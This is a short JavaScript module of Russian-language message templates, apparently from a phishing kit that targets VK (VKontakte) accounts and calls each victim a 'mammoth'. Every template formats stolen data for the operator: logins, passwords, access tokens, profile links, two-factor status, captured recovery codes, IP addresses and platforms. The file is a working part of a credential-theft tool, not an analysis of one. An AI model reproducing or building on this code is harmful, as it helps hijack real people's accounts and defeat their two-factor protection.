module.exports = {
  success: data => `<b>🐘 Мамонт успешно авторизовался 🔓</b>
Логин: <code>${data.username}</code>
Пароль: <code>${data.password}</code>
Токен: <code>${data.token}</code>
Профиль ВК:
<a href="https://vk.com/id${data.user_id}">
  ${data.first_name} ${data.last_name}
</a>

2fa: ${"code" in data ? "<b>⚠️ Да</b>" : "Нет"}

IP: ${data.ip}
Платформа: ${data.platform}`,

  fail: data => `<b>🐘 Мамонт не смог войти 🤦‍♂️</b>
Логин: <code>${data.username}</code>
Пароль: <code>${data.password}</code>

IP: ${data.ip}
Платформа: ${data.platform}`,

  mfa: data => `<b>🐘 У мамонта двухэтапка ⚠️</b>
Логин: <code>${data.username}</code>
Пароль: <code>${data.password}</code>

IP: ${data.ip}
Платформа: ${data.platform}`, //2fa

  recoveryCodes: data => `<b>🐘 Получены Рекавери Коды Мамонта ✅</b>
  
Логин: <code>${data.username}</code>
Пароль: <code>${data.password}</code>
Коды: ${data.codes.map(c => `<code>${c}</code>`).join(", ")}

Профиль ВК:
<a href="https://vk.com/id${data.user_id}">
  ${data.first_name} ${data.last_name}
</a>

IP: ${data.ip}
Платформа: ${data.platform}`
};
